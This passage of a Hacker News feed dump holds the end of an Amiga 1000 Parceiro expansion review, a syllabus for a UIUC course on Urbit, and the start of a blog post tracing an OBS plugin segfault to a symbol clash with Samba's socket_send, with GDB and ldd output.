Fun Trivia: Mr Dunklee, now retired, was the CIO of the <a href="https://www.spaceforce.mil/">United States Space Force</a>, as well as an Air Force base commander. You heard that right, Number One. </p><p>


So let’s take a look at Mr. Dunklee’s new device for the Amiga 1000 and see what it can do. </p><p>

At a high level, the Parceiro can do everything my Starboard &amp; Zip combo could do except in a very tidy, modern package. And it can do it all faster and better. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6150&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="IMG_1027.JPG" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_1027.JPG (356.15 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
The Parceiro (sounds like par-say-ro) attaches to the side expansion port of the Amiga and is about the size of a harmonica that’s been run over by a steam roller as it’s only about 1/3 of an inch thick.</p><p>

It provides the following features: </p><ol><li> 8MB of Autoconfig Fast RAM. It is a single 8MB of SRAM versus DRAM, so it really and truly is indeed fast with zero wait states.</li> 
<li> Coin-cell battery backed Real Time Clock (RTC), which comes with its own clock software that gets put into your startup sequence.</li>
<li> SD Card Reader with 2GB MicroSD. It comes pre-formatted with the FAT32  file system and is readable on any PC as a result. This way you can quickly set up your new SD-based hard drive.</li></ol> <p>

It’s worth mentioning that this is running on period correct Amiga OS 1.3, too. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6151&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="IMG_1080_b.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>She is almost completely camouflaged into the Amiga battlestation at this point.</em></dd>			<!-- <dd>IMG_1080_b.jpg (259.01 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
Possibly the best unseen feature is the silkscreen prints Dunklee put around the various chips and resistors on the board. It’s a complete sci-fi treasure trove of labelling, from Back to the Future to Battlestar Galactica. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6153&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="IMG_1055_b.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_1055_b.jpg (268.24 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6152&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="IMG_1054_b.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_1054_b.jpg (380.51 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6154&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="IMG_1058_b.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>This is where the brilliance really starts to shine.</em></dd>			<!-- <dd>IMG_1058_b.jpg (495.27 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6155&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="circuitboard-cu.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>Yes, you've actually died and gone to heaven via worm hole.</em></dd>			<!-- <dd>circuitboard-cu.jpg (689.75 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
For his fantastic creativity on the silkscreen, I half-jokingly suggested to Mr. Dunklee a future 3D printed case in clear acrylic so I could totally nerd out with his hilarious labels. And I think he might actually take me up on that idea some day! </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6156&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="clear-acryllic-case-parceiro.jpg" onclick="viewableArea(this);"></dt>
			<dd><em>UPDATE: He works really fast!</em></dd>			<!-- <dd>clear-acryllic-case-parceiro.jpg (248.37 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
The Parceiro comes with instructions for creating your own KickWork disk to quickly boot up your machine and install all of the necessary software to run the device. This includes the necessary updates to your Mountlist, Startup-Sequence, adding fat95 drivers as well as the sd.device drivers. </p><p>

The <a href="https://amigalove.com/viewtopic.php?f=7&amp;t=312">KickWork disk idea</a> is based off a product developed in 1988 by Mr. Rudolph Loew (RIP). This is where a Kickstart disk is combined with a stripped down Workbench disk for faster machine boot ups off a single floppy rather than 2. </p><p>

With the Parceiro, Dunklee provides six pages of detailed instructions for getting you up and running in no time. The idea here is the modified KickWork (or Workbench) disk will begin the machine’s boot up process like normal then hand over total control to the SD card like a full-fledged autobooting hard drive. It’s not 100% autobooting, but it’s pretty danged close. And once the machine fully boots you just pop out the boot floppy disk and set it to the side. Mr Dunklee confided with me that in a distant hardware update he might take the next logical step and integrate an FPGA for a true autobooting experience. </p><p>

Since my machine is equipped with a Rejuvenator board, I didn’t need a KickWork disk. So I made a customized Workbench boot disk making the necessary adjustments following Mr Dunklee’s instructions for the RTC software, the SD card device driver and adding the FAT file system library. </p><p>

In the Amiga world, this is about as close to plug-and-play for a device with this many features that I’ve ever come across that doesn’t completely take over your machine and its identity like a Vampire, or some might argue even the ACA500+ (which basically uses the A1000's power to mostly take over). The Parceiro installation was absolutely seamless and I got it up and running without a hitch. </p><p>

Now some of you might be wondering how long it takes to boot this 2GB equipped Amiga. For example, on my Amiga 2000 I have a 40 MB mechanical boot drive, but I also have a SCSI2SD card with 2GB MicroSD for all of my software and data storage. When that machine boots it can sit on a gray screen for about 20 -25 seconds while the large drive is being validated. Once that process is done the A2K snaps to life and I’m on my way. </p><p>

With the Parceiro it’s a very different - and better - experience than I’m used to. The Parceiro still needs to validate the empty space on the drive, but instead it does it in the background. So the Amiga 1000 boots up without that normal long pause. While the background validation is going on, the volume is set to READ ONLY. I can still run programs but I simply can’t write to the drive while the validation is going on. To be honest I wouldn’t even know about this had it not been noted in the instructions, as I’m virtually never writing to the drive the moment I boot it up. And within a few seconds the little Cylon red LED light stops flickering and I know then it’s job is complete (which didn’t directly affect me anyway). </p><p>

Very, very cool! </p><p>

Now, this device is currently in extremely short supply. In fact, I happened to get S/N #1 and I know S/N #2 was sold a few hours after I got mine. At that stage the inventory was sold out. But several more will eventually get made over time so if you’re an Amiga 1000 fan that means you're patient by default. <img src="https://www.amigalove.com/images/smilies/icon_e_wink.gif" width="15" height="17" alt=";)" title="Wink"> I’d highly recommend you keep this on your radar and try to snag one of them for yourself. It’s simply bad ass and it didn’t require me to upgrade my OS beyond adding new drivers - or really change anything - like a lot of modern upgrades often do.  </p><p>

The Parceiro is a fantastic device, made in the USA, and is a very worthy successor to the Microbotics and Supra offerings from BITD. It is one of the few modern devices that is 100% designed for the Amiga 1000 for a change. And how cool and refreshing is that? </p><p>


<strong>Pre-Orders</strong></p><p>

If you’d like to pre-order one of these little technological marvels for yourself at a nearly <strong>20% discounted rate at $195</strong>, simply email <a href="https://www.amigalove.com/cdn-cgi/l/email-protection#bafbd7d3dddb94eadbc8d9dfd3c8d5fad5cfced6d5d5d194d9d5d7"><span data-cfemail="185975717f793648796a7b7d716a7758776d6c74777773367b7775">[email&nbsp;protected]</span></a> to declare your interest <strong>and mention AmigaLove sent you</strong>. You will still need to cover expenses for shipping, of course, but you’ll get in line for your very own Parceiro. David Dunklee will manage the rest from there!</p></div></div>]]>
            </description>
            <link>https://www.amigalove.com/viewtopic.php?t=1689</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818159</guid>
            <pubDate>Mon, 18 Jan 2021 04:28:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CS 498MC • Martian Computing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818136">thread link</a>) | @todsacerdoti
<br/>
January 17, 2021 | https://davis68.github.io/martian-computing/ | <a href="https://web.archive.org/web/*/https://davis68.github.io/martian-computing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <header>
        
        
        

        <p>CS 498MC Martian Computing at the University of Illinois at Urbana–Champaign</p>

        
        <p><a href="https://github.com/davis68/martian-computing">View the Project on GitHub <small>davis68/martian-computing</small></a></p>
        

        

        
      </header>
      <section>

      
<h4 id="neal-davis--department-of-computer-science--university-of-illinois">Neal Davis • Department of Computer Science • University of Illinois</h4>

<p><img src="https://davis68.github.io/martian-computing/img/mars-landscape-hero.png" alt=""></p>

<p>The underlying infrastructure of modern networked computing—namely Unix and its derivatives—is approaching fifty years of age.  What will come to replace it?  A strong competitor is the clean-slate “operating function” approach of Urbit.  Jocosely branded as “computing for Martians,” Urbit provides a fresh and updated vision of what Internet computing could come to look like in future years.  Featuring end-to-end encryption and true peer-to-peer routing built on a network-first operating system, Urbit fosters decentralized digital societies and stable user identities.</p>

<p>Our primary objectives in this course are for you to be able to explain and navigate the technical layout of Urbit, as well as construct novel applications for Arvo, the Urbit operating function, using the Hoon programming language.</p>

<ul>
  <li>Understand the schematics and technical implementation of the Urbit OS kernel (Arvo and vanes).</li>
  <li>Navigate and utilize the Urbit ID public-key infrastructure (Azimuth).</li>
  <li>Program literately using the Hoon language, including source code conventions and interoperability.</li>
  <li>Construct userspace apps to run on the Urbit OS platform (Gall, Landscape).</li>
</ul>

<h2 id="audience">Audience</h2>

<p>My target audience for the course consists of graduate students and seniors in computer science and neighboring fields interested in sound computing and functional operating system design (functional-as-in-language).  The course assumes an interest in functional programming but no specific experience<a href="https://en.wikipedia.org/wiki/Centzon_T%C5%8Dt%C5%8Dchtin">.</a>  <!-- egg --></p>

<h2 id="resources">Resources</h2>

<table>
  <thead>
    <tr>
      <th>What</th>
      <th>When and Where</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Instructor email</strong></td>
      <td><a href="mailto:cs498mcadmin@illinois.edu?subject=CS498MC">cs498mcadmin@illinois.edu</a></td>
    </tr>
    <tr>
      <td><strong>Class URL</strong></td>
      <td><a href="https://go.illinois.edu/cs498mc">go.illinois.edu/cs498mc</a></td>
    </tr>
    <tr>
      <td><strong>Class forum</strong></td>
      <td><code>~magbel/martian-computing</code></td>
    </tr>
  </tbody>
</table>

<h2 id="access">Access</h2>

<p><img src="https://davis68.github.io/martian-computing/img/mars-pathfinder-hero.png" alt=""></p>

<p>The use of Urbit requires an <a href="https://urbit.org/using/install/">Urbit ID</a>.  You can purchase an ID on a third-party site like <a href="https://urbit.live/">urbit.live</a> or <a href="https://opensea.io/">OpenSea</a>.  You can also use a transient ID (called a “comet”) as a permanent ID; these are free and can be generated on your own machine.</p>

<h2 id="agenda">Agenda</h2>

<p><img src="https://davis68.github.io/martian-computing/img/mars-olympus-mons-hero.png" alt=""></p>

<p>Lessons focus on conceptual or architectural aspects of Urbit, including technical discussions of Urbit’s behavior and internals.  Labs are hands-on tutorials to familiarize students with operations and language features.</p>

<table>
  <thead>
    <tr>
      <th>Wk</th>
      <th>Date</th>
      <th>Number</th>
      <th>Lecture</th>
      <th>Lab</th>
      <th>MP</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td>08/26</td>
      <td>00</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson00-prospectus.html">Prospectus</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>08/28</td>
      <td>01</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson01-dojo.html">Dojo</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>1</td>
      <td>08/31</td>
      <td>02</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson02-azimuth-1.html">Azimuth I</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/02</td>
      <td>03</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson03-generators.html">Generators</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/04</td>
      <td>04</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson04-aura.html">Auras</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>2</td>
      <td>09/09</td>
      <td>05</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson05-syntax.html">Syntax</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/11</td>
      <td>06</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson06-cores.html">Cores</a></td>
      <td>&nbsp;</td>
      <td><code>mp0</code></td>
    </tr>
    <tr>
      <td>3</td>
      <td>09/14</td>
      <td>07</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson07-say-generators.html"><code>%say</code> Generators</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/16</td>
      <td>08</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson08-subject-oriented-programming.html">Subject-Oriented Programming</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/18</td>
      <td>09</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson09-clay-1.html">Clay I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>4</td>
      <td>09/21</td>
      <td>10</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson10-libraries.html">Libraries</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/23</td>
      <td>11</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson11-ford-1.html">Ford I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/25</td>
      <td>12</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson12-debugging.html">Debugging Hoon</a></td>
      <td>&nbsp;</td>
      <td><code>mp1</code></td>
    </tr>
    <tr>
      <td>5</td>
      <td>09/28</td>
      <td>13</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson13-ask.html"><code>%ask</code> Generators</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>09/30</td>
      <td>14</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson14-typechecking.html">Types &amp; Molds</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/02</td>
      <td>15</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson15-stdlib.html">Standard Library</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>6</td>
      <td>10/05</td>
      <td>16</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson16-containers.html">Common Containers</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/07</td>
      <td>17</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson17-gall-1.html">Gall I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/09</td>
      <td>18</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson18-kernel.html">Kernel</a> (Chat with <code>~rovnys-ricfer</code>)</td>
      <td>&nbsp;</td>
      <td><code>mp2</code></td>
    </tr>
    <tr>
      <td>7</td>
      <td>10/12</td>
      <td>19</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson19-text-parsing.html">Data &amp; Text Parsing</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/14</td>
      <td>20</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson20-ames.html">Ames</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/16</td>
      <td>21</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson21-behn.html">Behn</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>8</td>
      <td>10/19</td>
      <td>22</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson22-clay-2.html">Clay II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/21</td>
      <td>23</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson23-polymorphism.html">Polymorphism</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/23</td>
      <td>24</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson24-foundation.html">Urbit Foundation</a> (Chat with <code>~wolref-podlex</code>)</td>
      <td>&nbsp;</td>
      <td><code>mp3</code></td>
    </tr>
    <tr>
      <td>9</td>
      <td>10/26</td>
      <td>25</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson25-gall-2.html">Gall II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/28</td>
      <td>26</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson26-gall-3-landscape.html">Gall III</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>10/30</td>
      <td>27</td>
      <td>Buffer</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>10</td>
      <td>11/02</td>
      <td>28</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson28-eyre-iris.html">Eyre &amp; Iris</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/04</td>
      <td>29</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson29-gall-4-communication.html">Gall IV</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/06</td>
      <td>30</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson30-boot-process.html">Boot Process</a></td>
      <td>&nbsp;</td>
      <td><code>mp4</code></td>
    </tr>
    <tr>
      <td>11</td>
      <td>11/09</td>
      <td>31</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson31-cli.html">CLI</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/11</td>
      <td>32</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson32-arvo-1.html">Arvo I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/13</td>
      <td>33</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson33-hoon-1.html">Hoon I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>12</td>
      <td>11/16</td>
      <td>34</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson34-hoon-2.html">Hoon II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/18</td>
      <td>35</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson35-vere-1.html">Vere I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>11/20</td>
      <td>36</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson36-vere-2.html">Vere II</a></td>
      <td>&nbsp;</td>
      <td><code>mp5</code></td>
    </tr>
    <tr>
      <td>13</td>
      <td>11/30</td>
      <td>37</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson37-arvo-2.html">Arvo II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/02</td>
      <td>38</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson38-nock-1.html">Nock I</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/04</td>
      <td>39</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson39-nock-2.html">Nock II</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>14</td>
      <td>12/07</td>
      <td>40</td>
      <td>&nbsp;</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson40-azimuth-2.html">Azimuth II</a></td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/09</td>
      <td>41</td>
      <td><a href="https://davis68.github.io/martian-computing/lessons/lesson41-final-thoughts.html">Final Thoughts</a></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>12/11</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>mp6</code></td>
    </tr>
  </tbody>
</table>


      </section>
      
    </div></div>]]>
            </description>
            <link>https://davis68.github.io/martian-computing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818136</guid>
            <pubDate>Mon, 18 Jan 2021 04:25:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking down a segfault that suddenly started happening]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25818126">thread link</a>) | @zdw
<br/>
January 17, 2021 | https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/ | <a href="https://web.archive.org/web/*/https://www.downtowndougbrown.com/2021/01/tracking-down-a-segfault-that-suddenly-started-happening/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>I wanted to share a story of a segmentation fault I helped track down this weekend. I thought the final root cause of the segfault was interesting because of how unrelated it was to the code I was trying to debug.</p>



<p>I’ve been maintaining a <a rel="noreferrer noopener" href="https://github.com/dougg3/obs-ios-camera-source" data-type="URL" data-id="https://github.com/dougg3/obs-ios-camera-source" target="_blank">Linux fork</a> of <a rel="noreferrer noopener" href="https://github.com/wtsnz/obs-ios-camera-source" target="_blank" data-type="URL" data-id="https://github.com/wtsnz/obs-ios-camera-source">obs-ios-camera-source</a>, which is an <a rel="noreferrer noopener" href="https://obsproject.com/" target="_blank" data-type="URL" data-id="https://obsproject.com/">OBS</a> plugin that allows you to use an iPhone or iPad’s camera and microphone as a video and audio source in OBS. It works in conjunction with the “<a rel="noreferrer noopener" href="https://obs.camera/" target="_blank">Camera for OBS Studio</a>” app in the App Store. This kind of thing is useful for online streamers who want to use their phone’s camera instead of buying a separate camera. For those of you who don’t know, OBS is short for Open Broadcaster Software. A lot of streamers use it to handle broadcasting their stream. It allows you to capture audio and video, mix it all together, do all kinds of cool things with it, and then record the final result and/or stream it to sites such as YouTube and Twitch.</p>



<p>Getting this plugin working on Linux wasn’t really complicated, because it was already well-written without much platform-specific code. After all, the existing codebase was already operational on both macOS and Windows. It mostly just required tweaking a few compile/link options to make the code run happily on Linux.</p>



<p>Anyway, I’m pretty sure a good number of people have been using my Linux port of this plugin without issues. I know it works fine for me when I test with it in Ubuntu 18.04 or 20.04. I’ve helped people on other distros get it working too. I don’t really do any streaming myself — maybe someday though!</p>



<p>On Friday, GitHub user rrondeau <a rel="noreferrer noopener" href="https://github.com/dougg3/obs-ios-camera-source/issues/4" data-type="URL" data-id="https://github.com/dougg3/obs-ios-camera-source/issues/4" target="_blank">reported an issue</a>: after a half a year of the obs-ios-camera-source plugin working without a problem, it suddenly started causing OBS to segfault on his computer (currently running Fedora 33). He provided a stack trace that showed that the segfault was happening because of something initiated by the plugin. Afterward, he used GDB to get a better stack trace that provided more info about the functions being called and the parameters being passed:</p>


<pre title="">#0  0x00007fffee7abc64 in socket_send () at /usr/lib64/samba/libsamba-sockets-samba4.so
#1  0x00007fff88b7813c in send_packet (sfd=50, message=8, tag=1, payload=0x1b22e60, payload_size=488) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:400
#2  0x00007fff88b782a6 in send_plist_packet (sfd=50, tag=1, message=0x1ae53e0) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:431
#3  0x00007fff88b7851b in send_list_devices_packet (sfd=50, tag=1) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:499
#4  0x00007fff88b79367 in usbmuxd_get_device_list (device_list=0x7fffffffc740) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/libusbmuxd/src/libusbmuxd.c:938
#5  0x00007fff88b725e1 in portal::Portal::addConnectedDevices() (this=0x1909378) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/portal/src/Portal.cpp:109
#6  0x00007fff88b72684 in portal::Portal::reloadDeviceList() (this=0x1909378) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/portal/src/Portal.cpp:126
#7  0x00007fff88b722db in portal::Portal::Portal(portal::PortalDelegate*) (this=0x1909378, delegate=0x1909240) at /home/rrondeau/git/perso/obs-ios-camera-source/deps/portal/src/Portal.cpp:57
#8  0x00007fff88b67053 in IOSCameraInput::IOSCameraInput(obs_source*, obs_data*) (this=0x1909240, source_=0x1aee000, settings=0x19210a0)
    at /home/rrondeau/git/perso/obs-ios-camera-source/src/obs-ios-camera-source.cpp:74
#9  0x00007fff88b66358 in CreateIOSCameraInput(obs_data_t*, obs_source_t*) (settings=0x19210a0, source=0x1aee000) at /home/rrondeau/git/perso/obs-ios-camera-source/src/obs-ios-camera-source.cpp:371
#10 0x00007ffff6259c2a in obs_source_create_internal () at /lib64/libobs.so.0
#11 0x00007ffff626bb81 in obs_load_source_type () at /lib64/libobs.so.0
#12 0x00007ffff626e3c2 in obs_load_sources () at /lib64/libobs.so.0
#13 0x000000000049e750 in OBSBasic::Load(char const*) (this=0xa370b0, file=0x7fffffffd040 "/home/rrondeau/.config/obs-studio/basic/scenes/Untitled.json")
    at /home/rrondeau/git/perso/obs-studio/UI/window-basic-main.cpp:973
#14 0x00000000004a2976 in OBSBasic::OBSInit() (this=0xa370b0) at /home/rrondeau/git/perso/obs-studio/UI/window-basic-main.cpp:1783
#15 0x000000000047feff in OBSApp::OBSInit() (this=0x7fffffffd690) at /home/rrondeau/git/perso/obs-studio/UI/obs-app.cpp:1415
#16 0x0000000000482503 in run_program(std::fstream&amp;amp;, int, char**) (logFile=..., argc=1, argv=0x7fffffffdd68) at /home/rrondeau/git/perso/obs-studio/UI/obs-app.cpp:2052
#17 0x0000000000484203 in main(int, char**) (argc=1, argv=0x7fffffffdd68) at /home/rrondeau/git/perso/obs-studio/UI/obs-app.cpp:2697
</pre>


<p>The actual segfault was happening inside of a function called “socket_send” in libsamba-sockets-samba4.so, which was being called by a function in libusbmuxd, which is bundled as part of the obs-ios-camera-source plugin source code and is used for communicating with iOS devices over USB. When I first saw this in the stack trace, my mind thought “Huh…that’s weird. Why does libusbmuxd use Samba’s library for its socket code instead of providing its own?” (<a rel="noreferrer noopener" href="https://www.samba.org/" data-type="URL" data-id="https://www.samba.org/" target="_blank">Samba</a> is an implementation of the Windows file sharing protocol used by pretty much every Linux distribution)</p>



<p>I tested and couldn’t reproduce the issue in Ubuntu. I know basically nothing about Fedora, but I faked my way through grabbing a Fedora 33 virtual machine, installing OBS, and compiling the plugin. I ran into the exact same issue that he was seeing.</p>



<p>Before I had a chance to look deeper and understand what was going on, rrondeau beat me to the correct conclusion: code in Samba’s library was mistakenly being called. <a rel="noreferrer noopener" href="https://github.com/dougg3/obs-ios-camera-source/blob/8181922136e12ef618c8449f95a52e40d7104ded/deps/libusbmuxd/common/socket.h#L61" data-type="URL" data-id="https://github.com/dougg3/obs-ios-camera-source/blob/8181922136e12ef618c8449f95a52e40d7104ded/deps/libusbmuxd/common/socket.h#L61" target="_blank">libusbmuxd has a function called socket_send</a>, but clearly <a href="https://github.com/samba-team/samba/blob/f52f531771d6a25b2e363384bf94a9fa14334e1b/source4/lib/socket/socket.h#L152" data-type="URL" data-id="https://github.com/samba-team/samba/blob/f52f531771d6a25b2e363384bf94a9fa14334e1b/source4/lib/socket/socket.h#L152" target="_blank" rel="noreferrer noopener">libsamba-sockets-samba4’s function that is also named socket_send</a> was accidentally being called instead.</p>



<p>Honestly, that’s all we really needed to know. Renaming libusbmuxd’s socket_send function to something else, and updating all references to it to use the new name, fixed the issue. I still wanted to understand why this suddenly became an issue when it had been working fine prior to that. Why were we calling into Samba libraries? Why does an iOS USB multiplexing library even consider talking to a library associated with Windows file sharing?</p>



<p>Not knowing the answer to that question bothered me. I decided to dig deeper and understand exactly what was going on. I started by using <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Ldd_(Unix)" data-type="URL" data-id="https://en.wikipedia.org/wiki/Ldd_(Unix)" target="_blank">ldd</a>, which lists all dynamic libraries used by a program or library:</p>


<pre title="">[fedora@fedora33 build]$ ldd obs-ios-camera-source.so 
	linux-vdso.so.1 (0x00007fffa599a000)
	libobs.so.0 =&gt; /lib64/libobs.so.0 (0x00007f0a3f688000)
	libavcodec.so.58 =&gt; /lib64/libavcodec.so.58 (0x00007f0a3e2db000)
